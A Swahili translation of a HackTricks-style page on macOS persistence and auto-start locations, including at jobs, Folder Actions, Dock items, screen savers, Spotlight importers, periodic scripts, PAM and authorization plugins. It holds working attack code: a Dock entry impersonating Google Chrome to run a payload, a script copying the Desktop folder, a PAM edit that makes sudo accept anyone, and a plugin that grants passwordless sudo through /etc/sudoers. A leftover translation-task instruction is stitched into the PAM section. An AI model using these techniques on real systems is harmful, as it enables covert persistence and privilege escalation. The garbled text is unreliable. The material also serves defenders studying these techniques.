* Kuepuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* Unahitaji **kutekeleza** **`at`** na lazima iwe **imeamilishwa**

#### **Maelezo**

Kazi za `at` zimeundwa kwa ajili ya **kupangilia kazi za mara moja** zitakazotekelezwa wakati fulani. Tofauti na kazi za cron, kazi za `at` zinaondolewa moja kwa moja baada ya utekelezaji. Ni muhimu kuzingatia kuwa kazi hizi zinaendelea kuwepo hata baada ya kuanza upya kwa mfumo, na hivyo kuwa na wasiwasi wa usalama chini ya hali fulani.

Kwa chaguo-msingi, kazi hizi zimelemazwa lakini mtumiaji wa **root** anaweza **kuwawezesha** kwa kutumia:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Hii itaunda faili ndani ya saa 1:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Angalia foleni ya kazi kwa kutumia `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Hapa tunaweza kuona kazi mbili zilizopangwa. Tunaweza kuchapisha maelezo ya kazi kwa kutumia `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Ikiwa kazi za AT hazijawezeshwa, kazi zilizoundwa hazitatekelezwa.
{% endhint %}

**Faili za kazi** zinaweza kupatikana kwenye `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Jina la faili lina jumlisha foleni, nambari ya kazi, na wakati ambao imepangwa kutekelezwa. Kwa mfano, hebu tuangalie `a0001a019bdcd2`.

* `a` - hii ni foleni
* `0001a` - nambari ya kazi katika hex, `0x1a = 26`
* `019bdcd2` - wakati katika hex. Inawakilisha dakika zilizopita tangu epoch. `0x019bdcd2` ni `26991826` katika decimal. Ikiwa tunazidisha na 60 tunapata `1619509560`, ambayo ni `GMT: 2021. Aprili 27., Jumanne 7:46:00`.

Ikiwa tunachapisha faili ya kazi, tunagundua kuwa ina habari ile ile tuliyopata kwa kutumia `at -c`.

### Vitendo vya Folda

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Maelezo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini unahitaji kuweza kuita `osascript` na hoja za kuwasiliana na **`System Events`** ili uweze kusanidi Vitendo vya Folda
* Kukiuka TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Ina ruhusa za msingi za TCC kama Desktop, Documents na Downloads

#### Mahali

* **`/Library/Scripts/Folder Action Scripts`**
* Inahitaji mizizi
* **Kichocheo**: Kupata ufikiaji wa folda iliyotajwa
* **`~/Library/Scripts/Folder Action Scripts`**
* **Kichocheo**: Kupata ufikiaji wa folda iliyotajwa

#### Maelezo & Utekaji

Vitendo vya Folda ni hati zinazotumiwa moja kwa moja na mabadiliko katika folda kama vile kuongeza, kuondoa vitu, au hatua nyingine kama vile kufungua au kurekebisha dirisha la folda. Vitendo hivi vinaweza kutumika kwa kazi mbalimbali, na vinaweza kuchezeshwa kwa njia tofauti kama kutumia UI ya Finder au amri za terminali.

Kuweka Vitendo vya Folda, una chaguo kama:

1. Kuunda utiririshaji wa Vitendo vya Folda na [Automator](https://support.apple.com/guide/automator/welcome/mac) na kuiweka kama huduma.
2. Kuambatanisha hati kwa mkono kupitia Usanidi wa Vitendo vya Folda katika menyu ya muktadha ya folda.
3. Kutumia OSAScript kutuma ujumbe wa Tukio la Apple kwa `System Events.app` kwa kusanidi Vitendo vya Folda kwa njia ya programu.
* Njia hii ni hasa muhimu kwa kuingiza hatua katika mfumo, kutoa kiwango cha uthabiti.

Hati ifuatayo ni mfano wa kile kinachoweza kutekelezwa na Vitendo vya Folda:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Ili kufanya script iliyotajwa iweze kutumika na Hatua za Folda, itafsiri kwa kutumia:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Baada ya hati kuwa imekusanywa, weka Matendo ya Folda kwa kutekeleza hati ifuatayo. Hati hii itawezesha Matendo ya Folda kwa ujumla na kuambatanisha hati iliyokusanywa hapo awali kwenye folda ya Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Chalaza skripti ya usanidi na:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Hii ndiyo njia ya kutekeleza uthabiti huu kupitia GUI:

Hii ndiyo hati ambayo itatekelezwa:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Ikusanye na: `osacompile -l JavaScript -o folder.scpt source.js`

Hamisha kwa:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Kisha, fungua programu ya `Folder Actions Setup`, chagua **folda unayotaka kuangalia** na chagua katika kesi yako **`folder.scpt`** (katika kesi yangu niliita output2.scp):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Sasa, ikiwa unafungua folda hiyo na **Finder**, hati yako itatekelezwa.

Usanidi huu ulihifadhiwa katika **plist** iliyoko katika **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** katika muundo wa base64.

Sasa, jaribu kuandaa utendaji huu bila ufikiaji wa GUI:

1. **Nakili `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** kwenda `/tmp` ili kuifanya nakala rudufu:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Ondoa** Hatua za Folda ulizoweka tu:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sasa tukiwa na mazingira tupu

3. Nakili faili ya nakala rudufu: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Fungua programu ya Folder Actions Setup.app ili kutumia usanidi huu: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Na hii haikufanya kazi kwangu, lakini hizo ndizo maelekezo kutoka kwenye andiko:(
{% endhint %}

### Viunganishi vya Dock

Andiko: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Inatumika kukiuka sanduku la mchanga: [✅](https://emojipedia.org/check-mark-button)
* Lakini lazima uwe umeweka programu mbaya ndani ya mfumo
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* `~/Library/Preferences/com.apple.dock.plist`
* **Kitasa**: Wakati mtumiaji anapobonyeza programu ndani ya dock

#### Maelezo & Utekaji

Programu zote zinazoonekana kwenye Dock zinatajwa ndani ya plist: **`~/Library/Preferences/com.apple.dock.plist`**

Inawezekana **kuongeza programu** tu na:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Kwa kutumia **ufundi wa kijamii** unaweza **kujifanya kuwa Google Chrome** ndani ya dock na kisha kutekeleza script yako mwenyewe:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Wachukuzi wa Rangi

Andika: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Inatumika kuvuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Hatua maalum sana inahitajika
* Utamaliza katika sanduku la mchanga lingine
* Kuvuka TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* `/Library/ColorPickers`
* Inahitaji mizizi
* Kichocheo: Tumia chombo cha kuchagua rangi
* `~/Library/ColorPickers`
* Kichocheo: Tumia chombo cha kuchagua rangi

#### Maelezo & Uvamizi

**Kusanya kifurushi cha kuchagua rangi** na nambari yako (unaweza kutumia [**hii kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na ongeza constructor (kama katika sehemu ya [Screen Saver](macos-auto-start-locations.md#screen-saver)) na nakili kifurushi kwenye `~/Library/ColorPickers`.

Kisha, wakati chombo cha kuchagua rangi kinapochomwa, nambari yako inapaswa pia kuchomwa.

Tafadhali kumbuka kuwa mzigo wa binary unaopakia maktaba yako una **sanduku la mchanga lenye kizuizi sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Vichujio vya Finder

**Maelezo**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Maelezo**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Inatumika kukiuka sanduku la mchanga: **Hapana, kwa sababu unahitaji kutekeleza programu yako mwenyewe**
* Kukiuka TCC: ???

#### Mahali

* Programu maalum

#### Maelezo & Uvamizi

Mfano wa programu na Kichujio cha Finder [**unaweza kupatikana hapa**](https://github.com/D00MFist/InSync).

Programu zinaweza kuwa na `Vichujio vya Finder`. Kichujio hiki kitawekwa ndani ya programu ambayo itatekelezwa. Zaidi ya hayo, ili kichujio kiweze kutekeleza nambari yake, **lazima iwe imesainiwa** na cheti halali cha msanidi wa Apple, lazima iwe **imesandukwa** (ingawa kuna ruhusa za kubadilika) na lazima iwe imeandikishwa na kitu kama:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Maelezo: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Inatumika kupita kwenye sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini utamaliza kwenye sandbox ya programu ya kawaida
* Kizuizi cha TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* `/System/Library/Screen Savers`
* Inahitaji mizizi
* **Kichocheo**: Chagua skrini ya kuokoa
* `/Library/Screen Savers`
* Inahitaji mizizi
* **Kichocheo**: Chagua skrini ya kuokoa
* `~/Library/Screen Savers`
* **Kichocheo**: Chagua skrini ya kuokoa

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Maelezo & Uvamizi

Unda mradi mpya kwenye Xcode na chagua templeti ya kuzalisha **Screen Saver** mpya. Kisha, weka nambari yako ndani yake, kwa mfano nambari ifuatayo ya kuzalisha magogo.

**Jenga** hiyo, na nakili mfuko wa `.saver` kwenye **`~/Library/Screen Savers`**. Kisha, fungua GUI ya Screen Saver na ikiwa tu unapobofya, inapaswa kuzalisha magogo mengi:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Tafadhali kumbuka kwamba kwa sababu ndani ya ruhusu za binary ambayo inapakia nambari hii (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`** utakuwa **ndani ya sanduku la kawaida la programu**.
{% endhint %}

Nambari ya Saver:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Vichujio vya Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Inatumika kukiuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini utamaliza katika sanduku la programu
* Kukiuka TCC: [🔴](https://emojipedia.org/large-red-circle)
* Sanduku la programu linaonekana kuwa na kikomo sana

#### Mahali

* `~/Library/Spotlight/`
* **Kichocheo**: Faili mpya na kipengee kinachosimamiwa na kichujio cha Spotlight kinatengenezwa.
* `/Library/Spotlight/`
* **Kichocheo**: Faili mpya na kipengee kinachosimamiwa na kichujio cha Spotlight kinatengenezwa.
* Inahitaji mizizi
* `/System/Library/Spotlight/`
* **Kichocheo**: Faili mpya na kipengee kinachosimamiwa na kichujio cha Spotlight kinatengenezwa.
* Inahitaji mizizi
* `Some.app/Contents/Library/Spotlight/`
* **Kichocheo**: Faili mpya na kipengee kinachosimamiwa na kichujio cha Spotlight kinatengenezwa.
* Inahitaji programu mpya

#### Maelezo na Udukuzi

Spotlight ni kipengele cha utafutaji kilichojengwa ndani ya macOS, iliyoundwa kutoa watumiaji na **upatikanaji wa haraka na kamili wa data kwenye kompyuta zao**.\
Ili kurahisisha uwezo huu wa utafutaji wa haraka, Spotlight inaendeleza **hifadhidata ya kipekee** na kuunda kiashiria kwa **kuchambua faili nyingi**, kuruhusu utafutaji wa haraka kupitia majina ya faili na maudhui yao.

Mfumo wa msingi wa Spotlight unajumuisha mchakato wa kati unaoitwa 'mds', ambao unawajibika kwa huduma nzima ya Spotlight. Kwa kuongezea, kuna daemons kadhaa za 'mdworker' ambazo hufanya kazi mbalimbali za matengenezo, kama vile kuunda viashiria vya aina tofauti za faili (`ps -ef | grep mdworker`). Kazi hizi zinawezekana kupitia programu-jalizi za Spotlight, au **"vifurushi vya .mdimporter"**, ambavyo huwezesha Spotlight kuelewa na kuunda viashiria kwa aina mbalimbali za faili.

Vifurushi au **vifurushi vya `.mdimporter`** vipo katika maeneo yaliyotajwa hapo awali na ikiwa kifurushi kipya kinatokea, kinapakia ndani ya dakika (hakuna haja ya kuanzisha upya huduma yoyote). Vifurushi hivi vinahitaji kuonyesha **aina ya faili na nyongeza wanazoweza kusimamia**, kwa njia hii, Spotlight itavitumia wakati faili mpya na nyongeza iliyotajwa inatengenezwa.

Inawezekana **kupata `mdimporters`** zote zilizopakiwa kwa kukimbia:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumiwa kuchambua aina hizi za faili (nyongeza `.iba` na `.book` miongoni mwa zingine):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Ikiwa utachunguza Plist ya `mdimporter` nyingine, huenda usipate kuingia **`UTTypeConformsTo`**. Hiyo ni kwa sababu ni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) iliyojengwa na haifai kufafanua nyongeza.

Zaidi ya hayo, programu-jalizi za mfumo wa chaguo-msingi daima zinapewa kipaumbele, kwa hivyo mshambuliaji anaweza tu kupata faili ambazo hazijasajiliwa na `mdimporters` ya Apple.
{% endhint %}

Ili kuunda programu-jalizi yako mwenyewe, unaweza kuanza na mradi huu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) na kisha badilisha jina, **`CFBundleDocumentTypes`** na ongeza **`UTImportedTypeDeclarations`** ili iweze kusaidia nyongeza unayotaka kusaidia na uwakilishe katika **`schema.xml`**.\
Kisha **badilisha** nambari ya kazi **`GetMetadataForFile`** ili kutekeleza mzigo wako wakati faili na nyongeza iliyosindika inapoundwa.

Hatimaye, **jenga na nakili programu-jalizi yako mpya ya `.mdimporter`** kwa moja ya maeneo yaliyotajwa hapo awali na unaweza kuangalia wakati wowote inapopakia **kwa kufuatilia magogo** au kwa kuangalia **`mdimport -L.`**

### ~~Pane ya Mapendekezo~~

{% hint style="danger" %}
Haionekani kama hii inafanya kazi tena.
{% endhint %}

Andika: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Inafaa kwa kuzunguka kizuizi cha sanduku: [🟠](https://emojipedia.org/large-orange-circle)
* Inahitaji hatua maalum ya mtumiaji
* Kizuizi cha TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Maelezo

Haionekani kama hii inafanya kazi tena.

## Kizuizi cha Sanduku cha Mzizi

{% hint style="success" %}
Hapa unaweza kupata maeneo ya kuanza yanayofaa kwa **kuzunguka kizuizi cha sanduku** ambayo inakuwezesha tu kutekeleza kitu kwa **kuandika katika faili** ikiwa **mzizi** na/au inahitaji **hali zingine za ajabu.**
{% endhint %}

### Ya kawaida

Andika: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Inafaa kwa kuzunguka kizuizi cha sanduku: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa mzizi
* Kizuizi cha TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Inahitaji mzizi
* **Kichocheo**: Wakati wakati unafika
* `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local`
* Inahitaji mzizi
* **Kichocheo**: Wakati wakati unafika

#### Maelezo na Utekaji

Vielelezo vya kawaida (**`/etc/periodic`**) hutekelezwa kwa sababu ya **daemons za uzinduzi** zilizowekwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Kumbuka kuwa hati zilizohifadhiwa katika `/etc/periodic/` zinatekelezwa kama **mmiliki wa faili**, kwa hivyo hii haitafanya kazi kwa upandishaji wa haki za idhini.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Kuna hati nyingine za kawaida ambazo zitatekelezwa zilizoonyeshwa katika **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Ikiwa utafanikiwa kuandika faili yoyote kati ya `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` ita **tekelezwa mapema au baadaye**.

{% hint style="warning" %}
Tafadhali kumbuka kuwa skripti ya kipindi itatekelezwa kama mmiliki wa skripti. Kwa hivyo ikiwa mtumiaji wa kawaida anamiliki skripti, itatekelezwa kama mtumiaji huyo (hii inaweza kuzuia mashambulizi ya kuongeza mamlaka).
{% endhint %}

### PAM

Maelezo: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Maelezo: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Inatumika kwa kudukua sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na ruhusa ya msingi
* Kudukua TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

* Mara zote inahitajika kuwa na ruhusa ya msingi

#### Maelezo na Udukuzi

Kwa kuwa PAM inazingatia zaidi **udumu** na zisizo za kawaida ndani ya macOS, blogu hii haitatoa maelezo ya kina, **soma maelezo ili kuelewa mbinu hii vizuri**.

Angalia moduli za PAM na:
```bash
ls -l /etc/pam.d
```
Mbinu ya kudumu/kuongeza mamlaka kwa kutumia PAM ni rahisi kama kubadilisha moduli /etc/pam.d/sudo kwa kuongeza kwenye mwanzo mstari:
```bash
auth       sufficient     pam_permit.so
```
Hapa kuna yaliyomo kutoka kwenye kitabu cha kuhacki kuhusu mbinu za kuhacki. Yaliyomo yafuatayo ni kutoka kwenye faili /hive/hacktricks/macos-hardening/macos-auto-start-locations.md. Tafsiri maandishi muhimu kwa Kiswahili na rudisha tafsiri hiyo bila kubadilisha muundo wa markdown na html. Usitafsiri mambo kama nambari, majina ya mbinu za kuhacki, maneno ya kuhacki, majina ya jukwaa la wingu/SaaS (kama Workspace, aws, gcp...), neno 'leak', pentesting, na alama za markdown. Pia usiongeze chochote zaidi ya tafsiri na muundo wa markdown.
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Na kwa hivyo, jaribio lolote la kutumia **`sudo` litafanya kazi**.

{% hint style="danger" %}
Tafadhali kumbuka kuwa saraka hii inalindwa na TCC kwa hivyo ni uwezekano mkubwa kwamba mtumiaji atapata ombi la kupata ufikiaji.
{% endhint %}

### Vifaa vya Idhini

Maelezo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Maelezo: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Inatumika kuvuka sanduku la mchanga: [🟠](https://emojipedia.org/large-orange-circle)
* Lakini unahitaji kuwa na mizizi na kufanya mipangilio ya ziada
* Kuvuka TCC: ???

#### Mahali

* `/Library/Security/SecurityAgentPlugins/`
* Inahitaji mizizi
* Pia inahitajika kusanidi hifadhidata ya idhini kutumia kifaa cha idhini

#### Maelezo & Utekaji

Unaweza kuunda kifaa cha idhini ambacho kitatekelezwa wakati mtumiaji anapoingia ili kudumisha uthabiti. Kwa habari zaidi juu ya jinsi ya kuunda moja ya vifaa hivi vya idhini, angalia maelezo ya awali (na uwe mwangalifu, kifaa kisichoandikwa vizuri kinaweza kukufunga na utahitaji kusafisha mac yako kutoka kwa hali ya kupona).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
